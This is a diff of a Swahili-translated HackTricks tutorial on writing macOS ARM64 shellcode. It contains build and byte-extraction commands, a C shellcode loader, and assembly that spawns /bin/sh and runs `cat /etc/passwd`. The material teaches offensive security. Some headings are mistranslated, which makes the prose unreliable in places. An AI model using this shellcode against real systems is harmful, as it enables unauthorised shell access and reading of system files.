+Maranyingi ni rahisi kuangalia **mimbo iliyovunjuliwa** kutoka kwa **`libsystem_kernel.dylib`** **kuliko** kuangalia **mimbo ya chanzo** kwa sababu mimbo ya wito kadhaa (BSD na Mach) huzalishwa kupitia hati (angalia maoni kwenye mimbo ya chanzo) wakati kwenye dylib unaweza kupata ni nini kinachoitwa.
 {% endhint %}
 
 ### Shellcodes
 
-Kwa kuchapisha:
+Kukusanya:
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -267,7 +357,7 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
-Kuondoa herufi:
+Kutoa baits:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -276,7 +366,7 @@ done
 ```
 <details>
 
-<summary>Msimbo wa C kwa ajili ya kujaribu shellcode</summary>
+<summary>Msimbo wa C kufanya majaribio ya shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -324,9 +414,9 @@ return 0;
 ```
 </details>
 
-#### Shell
+#### Kifaa cha Kupashwa habari
 
-Imechukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) na kufafanuliwa.
+Kimechukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) na kufafanuliwa.
 
 {% tabs %}
 {% tab title="na adr" %}
@@ -344,6 +434,8 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 
 sh_path: .asciz "/bin/sh"
 ```
+{% endtab %}
+
 {% tab title="na stack" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
@@ -373,12 +465,9 @@ mov  x16, #59     ; Move the execve syscall number (59) into x16.
 svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 ```
-{% endtab %}
-{% endtabs %}
+#### Soma kwa kutumia cat
 
-#### Soma na cat
-
-Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, kwa hivyo hoja ya pili (x1) ni safu ya vigezo (ambavyo kumbukumbu inamaanisha rundo la anwani).
+Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni mfululizo wa vigezo (ambavyo kumbukumbu zake ni rundo la anwani).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -404,37 +493,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### Wito amri na sh kutoka kwa fork ili mchakato mkuu usiueke
-
-Unaweza kutumia `fork` kwenye programu yako ili kuunda mchakato mpya. Kisha, unaweza kutumia `exec` kwa kutumia amri ya `sh` ili kutekeleza amri yako ndani ya mchakato huo mpya. Hii inahakikisha kuwa mchakato mkuu haufi wakati amri inatekelezwa.
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-
-int main() {
-    pid_t pid = fork();
-
-    if (pid == 0) {
-        // Mchakato mtoto
-        execl("/bin/sh", "sh", "-c", "amri yako", NULL);
-        exit(0);
-    } else if (pid > 0) {
-        // Mchakato mzazi
-        wait(NULL);
-        printf("Amri imekamilika\n");
-    } else {
-        printf("Kuna hitilafu katika kujenga mchakato mtoto\n");
-    }
-
-    return 0;
-}
-```
-
-Kwa kufanya hivyo, unaweza kuhakikisha kuwa mchakato mkuu haufi wakati amri inatekelezwa.
+#### Amuru amri kwa kutumia sh kutoka kwa tawi ili mchakato mkuu usiuawe
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -633,14 +692,14 @@ svc  #0x1337
 ```
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
